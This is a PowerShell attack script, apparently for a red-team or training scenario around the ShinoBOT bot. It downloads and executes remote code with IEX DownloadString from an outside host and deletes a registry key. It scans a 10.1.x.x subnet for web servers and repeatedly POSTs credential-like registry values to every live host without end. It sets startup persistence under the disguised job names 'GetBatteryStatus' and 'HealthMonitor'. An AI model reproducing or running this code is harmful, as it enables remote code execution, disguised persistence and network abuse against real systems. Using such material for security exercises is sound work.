#
# Commands to startup Shinobot. Store at C:\Windows\system32\sb\sb_start.ps1
#
Remove-Item -Path "HKCU:\Software\ShinoBOT5" -Recurse
IEX (New-Object Net.WebClient).DownloadString('https://shinobotps1.com/download_get.php')


#
# Commands to continuously send web authentication traffic to the phishing web server.
#
function testport ($hostname, $port=80, $timeout=100) {
  $requestCallback = $state = $null
  $client = New-Object System.Net.Sockets.TcpClient
  $beginConnect = $client.BeginConnect($hostname,$port,$requestCallback,$state)
  Start-Sleep -milli $timeOut
  if ($client.Connected) { $open = $true } else { $open = $false }
  $client.Close()
  return $open
  [pscustomobject]@{hostname=$hostname;port=$port;open=$open}
}

$shinohid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name HID
$shinopid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name PID
$Payload = @{"username"=$shinohid.HID; "password"=$shinopid.PID; "instructions"="nice work. now go to shinobotps1.com "}

$LiveWebServers = @()
for ($i = 0; $i -le 250; $i += 1)
{
    for ($j = 3; $j -le 10; $j += 1)
    {
        $Target = "10.1.$i.$j"
        # $TestNet = Test-NetConnection $Target -Port 80
        if (testport -hostname $Target)
        {
            $LiveWebServers
            $LiveWebServers += $Target
            Invoke-WebRequest -Uri ("http://$Target") -Method POST -Body $Payload
        }
    }
}

while ($true)
{
    foreach ($Target in $LiveWebServers)
    {
        Invoke-WebRequest -Uri ("http://$Target") -Method POST -Body $Payload
    }
    Start-Sleep -Milliseconds 500
}

# 
# Commands to set the startup job
#
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
Register-ScheduledJob -Trigger $trigger -FilePath C:\Windows\System32\sb\sb_start.ps1 -Name GetBatteryStatus
$trigger2 = New-JobTrigger -AtStartup -RandomDelay 00:02:00
Register-ScheduledJob -Trigger $trigger2 -FilePath C:\Windows\System32\sb\sb.ps1 -Name HealthMonitor
